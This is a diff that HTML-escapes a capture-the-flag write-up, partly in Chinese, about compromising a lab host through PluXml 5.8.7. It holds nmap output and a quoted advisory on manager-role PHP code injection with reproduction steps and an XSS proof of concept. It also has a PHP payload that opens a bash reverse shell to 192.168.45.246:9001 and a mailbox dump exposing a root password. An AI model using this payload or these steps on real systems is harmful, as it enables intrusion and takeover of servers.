@@ -14,7 +14,7 @@ Nmap scan report for 192.168.196.28
 Host is up (0.14s latency).
 Not shown: 98 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.56 ((Debian))
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
@@ -57,11 +57,11 @@ In the PluXml PHP blogging platform (v5.8.7), a user with the manager role can i
 ## 4 Steps to Reproduce the Exploit
 1. Login with a manager account.
 2. In the Administration menu, select static pages and edit one of the pages.
-3. Insert PHP code with starting and closing tags <?php CODE ?>.
+3. Insert PHP code with starting and closing tags &lt;?php CODE ?&gt;.
 4. Save the changes and open the stored page.
 
 ## 5 Technical Description of the Vulnerability
-While the administrator role has the permission to edit PHP templates and, thus, can always execute arbitrary code, the manager role has no such privileges. Indeed, a manager can only edit so-called static - purely HTML-written- pages. However, in the file core/admin/statique.php and in the file core/admin/lib/class.plx.admin.php (in the function editStatique) no proper input sanitisation is done to filter PHP-opening- and closing-tags (<?php and ?>). As a consequence, the injected PHP code becomes executed on the server-side, even though it is integrated with HTML content. Additionally,note that an XSS-attack is also possible for a manager (proof of concept: by integrating <script>alert(/xss/)</script>) and hard to filter.
+While the administrator role has the permission to edit PHP templates and, thus, can always execute arbitrary code, the manager role has no such privileges. Indeed, a manager can only edit so-called static - purely HTML-written- pages. However, in the file core/admin/statique.php and in the file core/admin/lib/class.plx.admin.php (in the function editStatique) no proper input sanitisation is done to filter PHP-opening- and closing-tags (&lt;?php and ?&gt;). As a consequence, the injected PHP code becomes executed on the server-side, even though it is integrated with HTML content. Additionally,note that an XSS-attack is also possible for a manager (proof of concept: by integrating &lt;script&gt;alert(/xss/)&lt;/script&gt;) and hard to filter.
 ```
 
 
@@ -75,7 +75,7 @@ While the administrator role has the permission to edit PHP templates and, thus,
 尝试写webshell，发现无法动态解析执行，可能是一次性的，直接写shell。
 
 ```php
-<?php echo '123<br>'; system("bash -c 'bash -i >& /dev/tcp/192.168.45.246/9001 0>&1'");?>
+&lt;?php echo &#39;123&lt;br&gt;&#39;; system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.246/9001 0&gt;&amp;1&#39;&#34;);?&gt;
 ```
 
 再去加载页面，成功收到反弹shell
@@ -125,27 +125,27 @@ cat /var/www/local.txt
 www-data@plum:/tmp$ cat /var/mail/www-data
 cat /var/mail/www-data
 From root@localhost Fri Aug 25 06:31:47 2023
-Return-path: <root@localhost>
+Return-path: &lt;root@localhost&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400
 Received: from root by localhost with local (Exim 4.94.2)
-        (envelope-from <root@localhost>)
+        (envelope-from &lt;root@localhost&gt;)
         id 1qZU6V-0000El-Pw
         for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400
 To: www-data@localhost
 From: root@localhost
-Subject: URGENT - DDOS ATTACK"
+Subject: URGENT - DDOS ATTACK&#34;
 Reply-to: root@localhost
-Message-Id: <E1qZU6V-0000El-Pw@localhost>
+Message-Id: &lt;E1qZU6V-0000El-Pw@localhost&gt;
 Date: Fri, 25 Aug 2023 06:31:47 -0400
 
-We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:  
+We are under attack. We&#39;ve been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:  
 root:6s8kaZZNaZZYBMfh2YEW
 Thanks,
 Administrator
 
 From MAILER-DAEMON Mon Dec 04 10:02:09 2023
-Return-path: <>
+Return-path: &lt;&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Mon, 04 Dec 2023 10:02:09 -0500
 Received: from Debian-exim by localhost with local (Exim 4.94.2)
@@ -153,13 +153,13 @@ Received: from Debian-exim by localhost with local (Exim 4.94.2)
         for www-data@localhost; Mon, 04 Dec 2023 10:02:09 -0500
 X-Failed-Recipients: debian@localhost
 Auto-Submitted: auto-replied
-From: Mail Delivery System <Mailer-Daemon@localhost>
+From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
 To: www-data@localhost
-References: <E1rAASX-0001fo-IY@localhost>
+References: &lt;E1rAASX-0001fo-IY@localhost&gt;
 Content-Type: multipart/report; report-type=delivery-status; boundary=1701702129-eximdsn-2095242606
 MIME-Version: 1.0
 Subject: Mail delivery failed: returning message to sender
-Message-Id: <E1rAASX-0001gi-JO@localhost>
+Message-Id: &lt;E1rAASX-0001gi-JO@localhost&gt;
 Date: Mon, 04 Dec 2023 10:02:09 -0500
 
 --1701702129-eximdsn-2095242606
@@ -186,16 +186,16 @@ Status: 5.0.0
 --1701702129-eximdsn-2095242606
 Content-type: message/rfc822
 
-Return-path: <www-data@localhost>
+Return-path: &lt;www-data@localhost&gt;
 Received: from www-data by localhost with local (Exim 4.94.2)
-        (envelope-from <www-data@localhost>)
+        (envelope-from &lt;www-data@localhost&gt;)
         id 1rAASX-0001fo-IY
         for root@localhost; Mon, 04 Dec 2023 10:02:09 -0500
 To: root@localhost
 Auto-Submitted: auto-generated
 Subject: *** SECURITY information for localhost ***
-From: www-data <www-data@localhost>
-Message-Id: <E1rAASX-0001fo-IY@localhost>
+From: www-data &lt;www-data@localhost&gt;
+Message-Id: &lt;E1rAASX-0001fo-IY@localhost&gt;
 Date: Mon, 04 Dec 2023 10:02:09 -0500
 
 localhost : Dec  4 15:02:09 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
@@ -204,7 +204,7 @@ localhost : Dec  4 15:02:09 : www-data : 1 incorrect password attempt ; PWD=/tmp
 --1701702129-eximdsn-2095242606--
 
 From MAILER-DAEMON Mon Dec 04 10:06:20 2023
-Return-path: <>
+Return-path: &lt;&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Mon, 04 Dec 2023 10:06:20 -0500
 Received: from Debian-exim by localhost with local (Exim 4.94.2)
@@ -212,13 +212,13 @@ Received: from Debian-exim by localhost with local (Exim 4.94.2)
         for www-data@localhost; Mon, 04 Dec 2023 10:06:20 -0500
 X-Failed-Recipients: debian@localhost
 Auto-Submitted: auto-replied
-From: Mail Delivery System <Mailer-Daemon@localhost>
+From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
 To: www-data@localhost
-References: <E1rAAWa-0004Mm-VK@localhost>
+References: &lt;E1rAAWa-0004Mm-VK@localhost&gt;
 Content-Type: multipart/report; report-type=delivery-status; boundary=1701702380-eximdsn-199798543
 MIME-Version: 1.0
 Subject: Mail delivery failed: returning message to sender
-Message-Id: <E1rAAWa-0004Mp-Vl@localhost>
+Message-Id: &lt;E1rAAWa-0004Mp-Vl@localhost&gt;
 Date: Mon, 04 Dec 2023 10:06:20 -0500
 
 --1701702380-eximdsn-199798543
@@ -245,16 +245,16 @@ Status: 5.0.0
 --1701702380-eximdsn-199798543
 Content-type: message/rfc822
 
-Return-path: <www-data@localhost>
+Return-path: &lt;www-data@localhost&gt;
 Received: from www-data by localhost with local (Exim 4.94.2)
-        (envelope-from <www-data@localhost>)
+        (envelope-from &lt;www-data@localhost&gt;)
         id 1rAAWa-0004Mm-VK
         for root@localhost; Mon, 04 Dec 2023 10:06:20 -0500
 To: root@localhost
 Auto-Submitted: auto-generated
 Subject: *** SECURITY information for localhost ***
-From: www-data <www-data@localhost>
-Message-Id: <E1rAAWa-0004Mm-VK@localhost>
+From: www-data &lt;www-data@localhost&gt;
+Message-Id: &lt;E1rAAWa-0004Mm-VK@localhost&gt;
 Date: Mon, 04 Dec 2023 10:06:20 -0500
 
 localhost : Dec  4 15:06:20 : www-data : a password is required ; PWD=/tmp ; USER=root ; COMMAND=list
@@ -263,7 +263,7 @@ localhost : Dec  4 15:06:20 : www-data : a password is required ; PWD=/tmp ; USE
 --1701702380-eximdsn-199798543--
 
 From MAILER-DAEMON Mon Dec 04 10:31:07 2023
-Return-path: <>
+Return-path: &lt;&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Mon, 04 Dec 2023 10:31:07 -0500
 Received: from Debian-exim by localhost with local (Exim 4.94.2)
@@ -271,13 +271,13 @@ Received: from Debian-exim by localhost with local (Exim 4.94.2)
         for www-data@localhost; Mon, 04 Dec 2023 10:31:07 -0500
 X-Failed-Recipients: debian@localhost
 Auto-Submitted: auto-replied
-From: Mail Delivery System <Mailer-Daemon@localhost>
+From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
 To: www-data@localhost
-References: <E1rAAuZ-0004Pu-LF@localhost>
+References: &lt;E1rAAuZ-0004Pu-LF@localhost&gt;
 Content-Type: multipart/report; report-type=delivery-status; boundary=1701703867-eximdsn-1899843490
 MIME-Version: 1.0
 Subject: Mail delivery failed: returning message to sender
-Message-Id: <E1rAAuZ-0004Px-Lf@localhost>
+Message-Id: &lt;E1rAAuZ-0004Px-Lf@localhost&gt;
 Date: Mon, 04 Dec 2023 10:31:07 -0500
 
 --1701703867-eximdsn-1899843490
@@ -304,16 +304,16 @@ Status: 5.0.0
 --1701703867-eximdsn-1899843490
 Content-type: message/rfc822
 
-Return-path: <www-data@localhost>
+Return-path: &lt;www-data@localhost&gt;
 Received: from www-data by localhost with local (Exim 4.94.2)
-        (envelope-from <www-data@localhost>)
+        (envelope-from &lt;www-data@localhost&gt;)
         id 1rAAuZ-0004Pu-LF
         for root@localhost; Mon, 04 Dec 2023 10:31:07 -0500
 To: root@localhost
 Auto-Submitted: auto-generated
 Subject: *** SECURITY information for localhost ***
-From: www-data <www-data@localhost>
-Message-Id: <E1rAAuZ-0004Pu-LF@localhost>
+From: www-data &lt;www-data@localhost&gt;
+Message-Id: &lt;E1rAAuZ-0004Pu-LF@localhost&gt;
 Date: Mon, 04 Dec 2023 10:31:07 -0500
 
 localhost : Dec  4 15:31:07 : www-data : a password is required ; PWD=/var/mail ; USER=root ; COMMAND=list
@@ -322,7 +322,7 @@ localhost : Dec  4 15:31:07 : www-data : a password is required ; PWD=/var/mail 
 --1701703867-eximdsn-1899843490--
 
 From MAILER-DAEMON Mon Dec 04 10:47:49 2023
-Return-path: <>
+Return-path: &lt;&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Mon, 04 Dec 2023 10:47:49 -0500
 Received: from Debian-exim by localhost with local (Exim 4.94.2)
@@ -330,13 +330,13 @@ Received: from Debian-exim by localhost with local (Exim 4.94.2)
         for www-data@localhost; Mon, 04 Dec 2023 10:47:49 -0500
 X-Failed-Recipients: debian@localhost
 Auto-Submitted: auto-replied
-From: Mail Delivery System <Mailer-Daemon@localhost>
+From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
 To: www-data@localhost
-References: <E1rABAj-0004RP-5y@localhost>
+References: &lt;E1rABAj-0004RP-5y@localhost&gt;
 Content-Type: multipart/report; report-type=delivery-status; boundary=1701704869-eximdsn-523599222
 MIME-Version: 1.0
 Subject: Mail delivery failed: returning message to sender
-Message-Id: <E1rABAj-0004RS-6L@localhost>
+Message-Id: &lt;E1rABAj-0004RS-6L@localhost&gt;
 Date: Mon, 04 Dec 2023 10:47:49 -0500
 
 --1701704869-eximdsn-523599222
@@ -363,16 +363,16 @@ Status: 5.0.0
 --1701704869-eximdsn-523599222
 Content-type: message/rfc822
 
-Return-path: <www-data@localhost>
+Return-path: &lt;www-data@localhost&gt;
 Received: from www-data by localhost with local (Exim 4.94.2)
-        (envelope-from <www-data@localhost>)
+        (envelope-from &lt;www-data@localhost&gt;)
         id 1rABAj-0004RP-5y
         for root@localhost; Mon, 04 Dec 2023 10:47:49 -0500
 To: root@localhost
 Auto-Submitted: auto-generated
 Subject: *** SECURITY information for localhost ***
-From: www-data <www-data@localhost>
-Message-Id: <E1rABAj-0004RP-5y@localhost>
+From: www-data &lt;www-data@localhost&gt;
+Message-Id: &lt;E1rABAj-0004RP-5y@localhost&gt;
 Date: Mon, 04 Dec 2023 10:47:49 -0500
 
 localhost : Dec  4 15:47:49 : www-data : a password is required ; PWD=/var/mail ; USER=root ; COMMAND=list
@@ -381,7 +381,7 @@ localhost : Dec  4 15:47:49 : www-data : a password is required ; PWD=/var/mail 
 --1701704869-eximdsn-523599222--
 
 From MAILER-DAEMON Mon Dec 04 10:55:26 2023
-Return-path: <>
+Return-path: &lt;&gt;
 Envelope-to: www-data@localhost
 Delivery-date: Mon, 04 Dec 2023 10:55:26 -0500
 Received: from Debian-exim by localhost with local (Exim 4.94.2)
@@ -389,13 +389,13 @@ Received: from Debian-exim by localhost with local (Exim 4.94.2)
         for www-data@localhost; Mon, 04 Dec 2023 10:55:26 -0500
 X-Failed-Recipients: debian@localhost
 Auto-Submitted: auto-replied
-From: Mail Delivery System <Mailer-Daemon@localhost>
+From: Mail Delivery System &lt;Mailer-Daemon@localhost&gt;
 To: www-data@localhost
-References: <E1rABI6-0004Rn-TK@localhost>
+References: &lt;E1rABI6-0004Rn-TK@localhost&gt;
 Content-Type: multipart/report; report-type=delivery-status; boundary=1701705326-eximdsn-1486237684
 MIME-Version: 1.0
 Subject: Mail delivery failed: returning message to sender
-Message-Id: <E1rABI6-0004Rq-Tm@localhost>
+Message-Id: &lt;E1rABI6-0004Rq-Tm@localhost&gt;
 Date: Mon, 04 Dec 2023 10:55:26 -0500
 
 --1701705326-eximdsn-1486237684
@@ -422,16 +422,16 @@ Status: 5.0.0
 --1701705326-eximdsn-1486237684
 Content-type: message/rfc822
 
-Return-path: <www-data@localhost>
+Return-path: &lt;www-data@localhost&gt;
 Received: from www-data by localhost with local (Exim 4.94.2)
-        (envelope-from <www-data@localhost>)
+        (envelope-from &lt;www-data@localhost&gt;)
         id 1rABI6-0004Rn-TK
         for root@localhost; Mon, 04 Dec 2023 10:55:26 -0500
 To: root@localhost
 Auto-Submitted: auto-generated
 Subject: *** SECURITY information for localhost ***
-From: www-data <www-data@localhost>
-Message-Id: <E1rABI6-0004Rn-TK@localhost>
+From: www-data &lt;www-data@localhost&gt;
+Message-Id: &lt;E1rABI6-0004Rn-TK@localhost&gt;
 Date: Mon, 04 Dec 2023 10:55:26 -0500
 
 localhost : Dec  4 15:55:26 : www-data : a password is required ; PWD=/home ; USER=root ; COMMAND=list
